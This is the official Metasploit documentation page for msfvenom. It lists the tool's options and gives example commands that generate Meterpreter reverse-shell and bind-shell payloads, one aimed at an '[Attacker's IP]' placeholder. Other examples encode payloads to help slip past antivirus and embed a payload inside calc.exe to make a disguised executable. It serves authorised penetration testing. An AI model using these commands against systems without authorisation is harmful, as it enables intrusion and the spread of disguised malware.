# msfvenom - Official Documentation

Source: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html

Downloaded: 2025-12-26T20:06:20.116935

---

Link Search Menu Expand Document

[![Metasploit Logo](/assets/images/metasploit-logo-dark-external-use.svg) ](/)

  * [Home](/)
  * [Code Of Conduct](/docs/code-of-conduct.html)
  * [Modules](/docs/modules.html)
  * [Pentesting](/docs/pentesting/)
    * [Setting Module Options](/docs/pentesting/metasploit-guide-setting-module-options.html)
    * [Upgrading Shells to Meterpreter](/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html)
    * [Post Gather Modules](/docs/pentesting/metasploit-guide-post-gather-modules.html)
    * [HTTP + HTTPS](/docs/pentesting/metasploit-guide-http.html)
    * [Kubernetes](/docs/pentesting/metasploit-guide-kubernetes.html)
    * [MySQL](/docs/pentesting/metasploit-guide-mysql.html)
    * [PostgreSQL](/docs/pentesting/metasploit-guide-postgresql.html)
    * [SMB](/docs/pentesting/metasploit-guide-smb.html)
    * [SSH](/docs/pentesting/metasploit-guide-ssh.html)
    * [WinRM](/docs/pentesting/metasploit-guide-winrm.html)
    * [MSSQL](/docs/pentesting/metasploit-guide-mssql.html)
    * [LDAP](/docs/pentesting/metasploit-guide-ldap.html)
    * [Active Directory](/docs/pentesting/active-directory/)
      * [AD CS](/docs/pentesting/active-directory/ad-certificates/)
        * [Overview](/docs/pentesting/active-directory/ad-certificates/overview.html)
        * [Attacking AD CS ESC Vulnerabilities Using Metasploit](/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html)
        * [Vulnerable cert finder](/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html)
        * [Manage certificate templates](/docs/pentesting/active-directory/ad-certificates/ad_cs_cert_template.html)
        * [Request certificates](/docs/pentesting/active-directory/ad-certificates/icpr_cert.html)
      * [Kerberos](/docs/pentesting/active-directory/kerberos/)
        * [Overview](/docs/pentesting/active-directory/kerberos/overview.html)
        * [Authenticating to SMB/WinRM/etc](/docs/pentesting/active-directory/kerberos/service_authentication.html)
        * [Kerberos login enumeration and bruteforcing](/docs/pentesting/active-directory/kerberos/kerberos_login.html)
        * [Get Ticket granting tickets and service tickets](/docs/pentesting/active-directory/kerberos/get_ticket.html)
        * [Converting kirbi and ccache files](/docs/pentesting/active-directory/kerberos/ticket_converter.html)
        * [Forging tickets](/docs/pentesting/active-directory/kerberos/forge_ticket.html)
        * [Inspecting tickets](/docs/pentesting/active-directory/kerberos/inspect_ticket.html)
        * [Kerberoasting](/docs/pentesting/active-directory/kerberos/kerberoasting.html)
        * [Keytab support and decrypting wireshark traffic](/docs/pentesting/active-directory/kerberos/keytab.html)
        * [Resource-based constrained delegation (RBCD)](/docs/pentesting/active-directory/kerberos/rbcd.html)
        * [Unconstrained delegation](/docs/pentesting/active-directory/kerberos/unconstrained_delegation.html)
  * [Using Metasploit](/docs/using-metasploit/)
    * [Getting Started](/docs/using-metasploit/getting-started/)
      * [Nightly Installers](/docs/using-metasploit/getting-started/nightly-installers.html)
      * [Reporting a Bug](/docs/using-metasploit/getting-started/reporting-a-bug.html)
    * [Basics](/docs/using-metasploit/basics/)
      * [Running modules](/docs/using-metasploit/basics/using-metasploit.html)
      * [How to use a Metasploit module appropriately](/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html)
      * [How payloads work](/docs/using-metasploit/basics/how-payloads-work.html)
      * [Module Documentation](/docs/using-metasploit/basics/module-documentation.html)
      * [How to use a reverse shell in Metasploit](/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
      * [How to use msfvenom](/docs/using-metasploit/basics/how-to-use-msfvenom.html)
      * [Managing Sessions](/docs/using-metasploit/basics/managing-sessions.html)
    * [Intermediate](/docs/using-metasploit/intermediate/)
      * [Database Support](/docs/using-metasploit/intermediate/metasploit-database-support.html)
      * [Evading Anti Virus](/docs/using-metasploit/intermediate/evading-anti-virus.html)
      * [Exploit Ranking](/docs/using-metasploit/intermediate/exploit-ranking.html)
      * [Hashes and Password Cracking](/docs/using-metasploit/intermediate/hashes-and-password-cracking.html)
      * [Metasploit Plugins](/docs/using-metasploit/intermediate/how-to-use-plugins.html)
      * [Payload UUID](/docs/using-metasploit/intermediate/payload-uuid.html)
      * [Pivoting in Metasploit](/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
      * [Running Private Modules](/docs/using-metasploit/intermediate/running-private-modules.html)
    * [Advanced](/docs/using-metasploit/advanced/)
      * [How to Configure DNS](/docs/using-metasploit/advanced/how-to-configure-dns.html)
      * [Metasploit Web Service](/docs/using-metasploit/advanced/metasploit-web-service.html)
      * [Meterpreter](/docs/using-metasploit/advanced/meterpreter/)
        * [Overview](/docs/using-metasploit/advanced/meterpreter/meterpreter.html)
        * [Configuration](/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html)
        * [Debugging Dead Meterpreter Sessions](/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html)
        * [Debugging Meterpreter Sessions](/docs/using-metasploit/advanced/meterpreter/meterpreter-debugging-meterpreter-sessions.html)
        * [ExecuteBof Command](/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html)
        * [HTTP Communication](/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html)
        * [How to get started with writing a Meterpreter script](/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html)
        * [Paranoid Mode](/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html)
        * [Powershell Extension](/docs/using-metasploit/advanced/meterpreter/powershell-extension.html)
        * [Python Extension](/docs/using-metasploit/advanced/meterpreter/python-extension.html)
        * [Reg Command](/docs/using-metasploit/advanced/meterpreter/meterpreter-reg-command.html)
        * [Reliable Network Communication](/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html)
        * [Sleep Control](/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html)
        * [Stageless Mode](/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html)
        * [The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers](/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html)
        * [Timeout Control](/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html)
        * [Transport Control](/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html)
        * [Unicode Support](/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html)
        * [Wishlist](/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html)
      * [RPC](/docs/using-metasploit/advanced/RPC/)
        * [How to use Metasploit JSON RPC](/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-json-rpc.html)
        * [How to use Metasploit Messagepack RPC](/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-messagepack-rpc.html)
    * [Other](/docs/using-metasploit/other/)
      * [How to use Metasploit with ngrok](/docs/using-metasploit/other/how-to-use-metasploit-with-ngrok.html)
      * [How to use the Favorite command](/docs/using-metasploit/other/how-to-use-the-favorite-command.html)
      * [Information About Unmet Browser Exploit Requirements](/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html)
      * [Oracle Support](/docs/using-metasploit/other/oracle-support/)
        * [How to get Oracle Support working with Kali Linux](/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html)
        * [Oracle Usage](/docs/using-metasploit/other/oracle-support/oracle-usage.html)
      * [Why CVE is not available](/docs/using-metasploit/other/why-cve-is-not-available.html)
  * [Development](/docs/development/)
    * [Get Started](/docs/development/get-started/)
      * [Contributing to Metasploit](/docs/development/get-started/contributing-to-metasploit.html)
      * [Creating Your First PR](/docs/development/get-started/creating-your-first-pr.html)
      * [Setting Up a Metasploit Development Environment](/docs/development/get-started/setting-up-a-metasploit-development-environment.html)
      * [Sanitizing PCAPs](/docs/development/get-started/sanitizing-pcaps.html)
      * [Git](/docs/development/get-started/git/)
        * [Git Reference Sites](/docs/development/get-started/git/git-reference-sites.html)
        * [Git cheatsheet](/docs/development/get-started/git/git-cheatsheet.html)
        * [Keeping in sync with rapid7 master](/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html)
        * [Remote Branch Pruning](/docs/development/get-started/git/remote-branch-pruning.html)
        * [Using Git](/docs/development/get-started/git/using-git.html)
      * [Navigating the codebase](/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html)
    * [Developing Modules](/docs/development/developing-modules/)
      * [Guides](/docs/development/developing-modules/guides/)
        * [Scanners](/docs/development/developing-modules/guides/scanners/)
          * [Writing a HTTP LoginScanner](/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html)
          * [Writing an FTP LoginScanner](/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html)
        * [How to check Microsoft patch levels for your exploit](/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html)
        * [How to use Fetch Payloads](/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
        * [How to use command stagers](/docs/development/developing-modules/guides/how-to-use-command-stagers.html)
        * [How to write a check method](/docs/development/developing-modules/guides/how-to-write-a-check-method.html)
        * [How to write a cmd injection module](/docs/development/developing-modules/guides/how-to-write-a-cmd-injection-module.html)
        * [Writing a browser exploit](/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html)
        * [Writing a post module](/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html)
        * [Writing an auxiliary module](/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html)
        * [Writing an exploit](/docs/development/developing-modules/guides/get-started-writing-an-exploit.html)
      * [External Modules](/docs/development/developing-modules/external-modules/)
        * [Overview](/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html)
        * [Writing GoLang Modules](/docs/development/developing-modules/external-modules/writing-external-golang-modules.html)
        * [Writing Python Modules](/docs/development/developing-modules/external-modules/writing-external-python-modules.html)
      * [Module metadata](/docs/development/developing-modules/module-metadata/)
        * [Definition of Module Reliability Side Effects and Stability](/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html)
        * [How to use datastore options](/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html)
        * [Module Reference Identifiers](/docs/development/developing-modules/module-metadata/module-reference-identifiers.html)
      * [Libraries](/docs/development/developing-modules/libraries/)
        * [API](/docs/development/developing-modules/libraries/api.html)
        * [AuthBrute](/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html)
        * [Cleanup](/docs/development/developing-modules/libraries/how-to-cleanup-after-module-execution.html)
        * [Compiling C](/docs/development/developing-modules/libraries/c/)
          * [Overview](/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html)
          * [Base64 Support](/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html)
          * [RC4 Support](/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html)
          * [XOR Support](/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html)
        * [Deserialization](/docs/development/developing-modules/libraries/deserialization/)
          * [Dot Net Deserialization](/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html)
          * [Java Deserialization](/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html)
        * [Fail_with](/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html)
        * [Fileformat](/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html)
        * [Git Mixin](/docs/development/developing-modules/libraries/how-to-use-the-git-mixin-to-write-an-exploit-module.html)
        * [HTTP](/docs/development/developing-modules/libraries/http/)
          * [BrowserExploitServer](/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html)
          * [How to Send an HTTP Request Using HttpClient](/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html)
          * [How to parse an HTTP response](/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html)
          * [How to send an HTTP request using Rex Proto Http Client](/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html)
          * [How to write a module using HttpServer and HttpClient](/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html)
        * [Logging](/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html)
        * [Obfuscation](/docs/development/developing-modules/libraries/obfuscation/)
          * [C Obfuscation](/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html)
          * [JavaScript Obfuscation](/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html)
        * [PhpExe](/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html)
        * [PostMixins](/docs/development/developing-modules/libraries/post-mixins.html)
        * [Powershell](/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html)
        * [Railgun](/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html)
        * [ReflectiveDLL Injection](/docs/development/developing-modules/libraries/using-reflectivedll-injection.html)
        * [Reporting and Storing Data](/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html)
        * [SEH Exploitation](/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html)
        * [SMB Library](/docs/development/developing-modules/libraries/smb_library/)
          * [Guidelines for Writing Modules with SMB](/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html)
          * [What my Rex Proto SMB Error means](/docs/development/developing-modules/libraries/smb_library/what-my-rex-proto-smb-error-means.html)
        * [SQL Injection](/docs/development/developing-modules/libraries/sql-injection-libraries.html)
        * [TCP](/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html)
        * [WbemExec](/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html)
        * [Zip](/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html)
    * [Google Summer of Code](/docs/development/google-summer-of-code/)
      * [2017 Mentor Organization Application](/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html)
      * [2017 Project Ideas](/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html)
      * [2017 Student Proposal](/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html)
      * [2018 Project Ideas](/docs/development/google-summer-of-code/gsoc-2018-project-ideas.html)
      * [2019 Project Ideas](/docs/development/google-summer-of-code/gsoc-2019-project-ideas.html)
      * [2020 Project Ideas](/docs/development/google-summer-of-code/gsoc-2020-project-ideas.html)
      * [2021 Project Ideas](/docs/development/google-summer-of-code/gsoc-2021-project-ideas.html)
      * [2022 Project Ideas](/docs/development/google-summer-of-code/gsoc-2022-project-ideas.html)
      * [2023 Project Ideas](/docs/development/google-summer-of-code/gsoc-2023-project-ideas.html)
      * [How to Apply to GSoC](/docs/development/google-summer-of-code/how-to-apply-to-gsoc.html)
    * [Maintainers](/docs/development/maintainers/)
      * [Committer Keys](/docs/development/maintainers/committer-keys.html)
      * [Committer Rights](/docs/development/maintainers/committer-rights.html)
      * [Downloads by Version](/docs/development/maintainers/downloads-by-version.html)
      * [Metasploit Hackathons](/docs/development/maintainers/metasploit-hackathons.html)
      * [Metasploit Loginpalooza](/docs/development/maintainers/metasploit-loginpalooza.html)
      * [Process](/docs/development/maintainers/process/)
        * [Assigning Labels](/docs/development/maintainers/process/assigning-labels.html)
        * [Guidelines for Accepting Modules and Enhancements](/docs/development/maintainers/process/guidelines-for-accepting-modules-and-enhancements.html)
        * [How to deprecate a Metasploit module](/docs/development/maintainers/process/how-to-deprecate-a-metasploit-module.html)
        * [Landing Pull Requests](/docs/development/maintainers/process/landing-pull-requests.html)
        * [Release Notes](/docs/development/maintainers/process/adding-release-notes-to-prs.html)
        * [Rolling back merges](/docs/development/maintainers/process/rolling-back-merges.html)
        * [Unstable Modules](/docs/development/maintainers/process/unstable-modules.html)
      * [Ruby Gems](/docs/development/maintainers/ruby-gems/)
        * [Adding and Updating](/docs/development/maintainers/ruby-gems/how-to-add-and-update-gems-in-metasploit-framework.html)
        * [Merging Metasploit Payload Gem Updates](/docs/development/maintainers/ruby-gems/merging-metasploit-payload-gem-updates.html)
        * [Using local Gems](/docs/development/maintainers/ruby-gems/using-local-gems.html)
    * [Proposals](/docs/development/propsals/)
      * [Bundled Modules Proposal](/docs/development/propsals/bundled-modules-proposal.html)
      * [Java Meterpreter Feature Parity Proposal](/docs/development/propsals/java-meterpreter-feature-parity-proposal.html)
      * [MSF6 Feature Proposals](/docs/development/propsals/msf6-feature-proposals.html)
      * [Metasploit URL support proposal](/docs/development/propsals/metasploit-url-support-proposal.html)
      * [Payload Rename Justification](/docs/development/propsals/payload-rename-justification.html)
      * [Uberhandler](/docs/development/propsals/uberhandler.html)
      * [Work needed to allow msfdb to use postgresql common](/docs/development/propsals/work-needed-to-allow-msfdb-to-use-postgresql-common.html)
    * [Quality](/docs/development/quality/)
      * [Common Metasploit Module Coding Mistakes](/docs/development/quality/common-metasploit-module-coding-mistakes.html)
      * [Loading Test Modules](/docs/development/quality/loading-test-modules.html)
      * [Measuring Metasploit Performance](/docs/development/quality/measuring-metasploit-performance.html)
      * [Msftidy](/docs/development/quality/msftidy.html)
      * [Payload Testing](/docs/development/quality/payload-testing.html)
      * [Style Tips](/docs/development/quality/style-tips.html)
      * [Using Rubocop](/docs/development/quality/using-rubocop.html)
      * [Writing Module Documentation](/docs/development/quality/writing-module-documentation.html)
    * [Roadmap](/docs/development/roadmap/)
      * [2017 Roadmap](/docs/development/roadmap/2017-roadmap.html)
      * [2017 Roadmap Review](/docs/development/roadmap/2017-roadmap-review.html)
      * [Metasploit Breaking Changes](/docs/development/roadmap/metasploit-breaking-changes.html)
      * [Metasploit Data Service](/docs/development/roadmap/metasploit-data-service-enhancements-goliath.html)
      * [Metasploit Framework 5.0 Release Notes](/docs/development/roadmap/metasploit-5-release-notes.html)
      * [Metasploit Framework 6.0 Release Notes](/docs/development/roadmap/metasploit-6-release-notes.html)
      * [Metasploit Framework Wish List](/docs/development/roadmap/metasploit-framework-wish-list.html)
  * [Contact](/docs/contact.html)
This site uses [Just the Docs](https://github.com/pmarsceill/just-the-docs), a
documentation theme for Jekyll.

  * [ Metasploit Framework on GitHub ](//github.com/rapid7/metasploit-framework)

  1. [Using Metasploit](/docs/using-metasploit/)
  2. [Basics](/docs/using-metasploit/basics/)
  3. How to use msfvenom

Msfvenom is the combination of payload generation and encoding. It replaced
msfpayload and msfencode on June 8th 2015.

To start using msfvenom, first please take a look at the options it supports:

    
    
    Options:
        -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
            --payload-options            List the payload's standard options
        -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
        -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
        -f, --format        <format>     Output format (use --help-formats for a list)
            --help-formats               List available formats
        -e, --encoder       <encoder>    The encoder to use
        -a, --arch          <arch>       The architecture to use
            --platform      <platform>   The platform of the payload
            --help-platforms             List available platforms
        -s, --space         <length>     The maximum size of the resulting payload
            --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
        -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
        -i, --iterations    <count>      The number of times to encode the payload
        -c, --add-code      <path>       Specify an additional win32 shellcode file to include
        -x, --template      <path>       Specify a custom executable file to use as a template
        -k, --keep                       Preserve the template behavior and inject the payload as a new thread
        -o, --out           <path>       Save the payload
        -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
            --smallest                   Generate the smallest possible payload
        -h, --help                       Show this message
    

#  How to generate a payload

To generate a payload, there are two flags that you must supply (-p and -f):

  * **The -p flag: Specifies what payload to generate**

To see what payloads are available from Framework, you can do:

    
    
    ./msfvenom -l payloads
    

The -p flag also supports “-“ as a way to accept a custom payload:

    
    
    cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
    

  * **The -f flag: Specifies the format of the payload**

Syntax example:

    
    
    ./msfvenom -p windows/meterpreter/bind_tcp -f exe
    

To see what formats are supported, you can do the following to find out:

    
    
    ./msfvenom --help-formats
    

Typically, this is probably how you will use msfvenom:

    
    
    $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
    

#  How to encode a payload

By default, the encoding feature will automatically kick in when you use the
-b flag (the badchar flag). In other cases, you must use the -e flag like the
following:

    
    
    ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
    

To find out what encoders you can use, you can use the -l flag:

    
    
    ./msfvenom -l encoders
    

You can also encode the payload multiple times using the -i flag. Sometimes
more iterations may help avoiding antivirus, but know that encoding isn’t
really meant to be used a real AV evasion solution:

    
    
    ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
    

#  How to avoid bad characters

The -b flag is meant to be used to avoid certain characters in the payload.
When this option is used, msfvenom will automatically find a suitable encoder
to encode the payload:

    
    
    ./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
    

#  How to supply a custom template

By default, msfvenom uses templates from the msf/data/templates directory. If
you’d like to choose your own, you can use the -x flag like the following:

    
    
    ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe 
    

Please note: If you’d like to create a x64 payload with a custom x64 custom
template for Windows, then instead of the exe format, you should use exe-only:

    
    
    ./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
    

The -x flag is often paired with the -k flag, which allows you to run your
payload as a new thread from the template. However, this currently is only
reliable for older Windows machines such as x86 Windows XP.

#  How to chain msfvenom output

The old `msfpayload` and `msfencode` utilities were often chained together in
order layer on multiple encodings. This is possible using `msfvenom` as well:

    
    
    ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
    ./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
    ./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
    

* * *

Back to top

[Edit this page on GitHub](https://github.com/rapid7/metasploit-
framework/tree/master/docs/metasploit-framework.wiki/How-to-use-msfvenom.md)

